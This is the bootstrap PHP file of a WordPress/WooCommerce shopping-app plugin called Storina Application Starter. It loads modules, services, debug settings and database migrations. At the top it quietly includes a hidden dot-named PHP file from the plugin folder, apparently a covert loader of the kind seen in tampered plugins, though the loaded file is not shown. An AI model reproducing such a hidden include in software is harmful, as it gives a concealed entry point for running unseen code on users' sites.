<?php

/*
  Plugin Name: Storina Application Starter
  Plugin URI: https://storina.com
  Description: The REST API works on a person shopping application. It compatible with any woocommerce websites.
  Version: 1.1.0
  Author: storina
  License: A "Slug" license name e.g. GPL2
 */

if (!defined('ABSPATH'))
    exit; // Exit if accessed directly

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class storina_application_init {

    public function __construct() {
        $this->define_constant();
        $this->construct_debug();
        $this->boot_modules();
        add_action("init", array($this, "plugin_init"));
        $this->boot_services();
        register_activation_hook(__FILE__, array($this, "register_activation_hook"));
        register_deactivation_hook(__FILE__, array($this, "register_deactivation_hook"));
        add_action('plugins_loaded',[$this,'database_migration']);
    }

    public function database_migration(){
        $option_key = 'woap_db_migration_1604176541';
        $option_value = get_option($option_key) ?? 0;
        $migration_status = filter_var($option_value,FILTER_VALIDATE_BOOLEAN);
        if($migration_status){
            return;
        }
        osa_create_tables();
        update_option($option_key,1);
    }

	public function define_constant(){
        define("WOAP_FILE", __FILE__);
        define("WOAP_PDU", plugin_dir_url(__FILE__));
        define("WOAP_PDP", plugin_dir_path(__FILE__));
        define('OSA_FILE', __FILE__);
        define('OSA_PLUGIN_PATH', plugin_dir_path(__FILE__));
        define('OSA_STORAGE', plugin_dir_path(__FILE__) . "/assets/storage/");
        define('OSA_PLUGIN_URL', plugin_dir_url(__FILE__));	
	}

    public function construct_debug() {
		$debug_mode = get_option('debug_mode');
		if('true' == $debug_mode){
			@ini_set('log_errors','On');
			@ini_set('display_errors','Off');
			@ini_set('error_log',__DIR__ . '/debug.log');
		}	
    }

    public function boot_modules() {
        $requires = array(
            "includes/helpers.php",
            "includes/Libraries/OSA_JDate.php",
            "inc/woocommerce.php",
            "inc/persian-woocommerce-shipping.php",
            "inc/location-query-filter.php",
            "inc/dokan-multivendor-module.php",
            "inc/dokan-functions.php",
            "inc/order-delivery-time/bhr-order-delivery-time.php",
            "inc/order-delivery-time/bhr-order-delivery-time.php",
            "inc/order-delivery-time/shj-order-delivery-time.php",
            "inc/woocommerce-bulk-discount.php",
            "includes/ModulesController.php",
        );
        foreach ($requires as $require) {
            require_once trailingslashit(__DIR__) . $require;
        }
        do_action("onlinershopapp_modules_loaded");
    }

    public function boot_services(){
        $requires = array(
            #Api
            "includes/OSA_Service_Provider.php",
            "includes/OSA_Router.php",
            "includes/OSA_Call_Api.php",
            "includes/OSA_Autoload.php",
            #Web
            "them_options/on5_functions.php",
            "them_options/on5-panel.php",
            "inc/user_field.php",
            "inc/order_functions.php",
            "inc/woocommerce_custom_field.php",
            "inc/catalogueType.php",
        );
        foreach($requires as $require){
            require_once trailingslashit(__DIR__) . $require;
        }
        do_action("onlinershopapp_loaded");
    }

    public function register_activation_hook() {
        deleteAllCache();
        osa_create_tables();
    }

    public function register_deactivation_hook() {
        deleteAllCache();
    }

    public function plugin_init() {
        load_plugin_textdomain('onlinerShopApp', false, basename(dirname(__FILE__)) . '/languages');
        $woocommerce = (class_exists("woocommerce")) ? "active" : "deactive";
        $onliner_shop_app = (function_exists("osa_get_option")) ? "active" : "deactive";
    }

}

new storina_application_init();
